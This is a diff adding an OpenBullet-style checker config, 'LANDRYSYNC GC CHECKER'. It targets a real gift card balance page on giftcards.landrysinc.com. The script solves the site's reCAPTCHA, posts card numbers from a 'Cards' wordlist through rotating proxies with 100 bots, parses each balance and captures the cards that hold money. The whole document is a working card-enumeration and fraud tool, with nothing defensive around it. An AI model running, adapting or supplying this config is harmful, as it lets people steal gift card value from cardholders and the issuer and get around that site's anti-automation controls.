@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "LANDRYSYNC GC CHECKER",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-28T02:09:44.950145+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://giftcards.landrysinc.com/Service/Balance" "6LfLE1UUAAAAAColpHUeUFQg_UxU12v8d3PQl3q8" -> VAR "RECAP" 
+REQUEST POST "https://giftcards.landrysinc.com/Service/Balance" AutoRedirect=TRUE 
+  CONTENT "tx_card=<USER>&g-recaptcha-response=<RECAP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://giftcards.landrysinc.com/Service/Balance" 
+  HEADER "Origin: https://giftcards.landrysinc.com" 
+PARSE "<SOURCE>" LR "\"><b>Balance:</b> " "<br><" Recursive=FALSE -> VAR "BALANCE" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<BALANCE>" NotEqualTo "$\" + Balance + \"" 
+  KEYCHAIN Failure OR 
+    KEY "<BALANCE>" EqualTo "$\" + Balance + \"" 
+PARSE "<SOURCE>" LR "\"><b>Balance:</b> " "<br><" Recursive=FALSE -> CAP "HOLDS" "" "" 
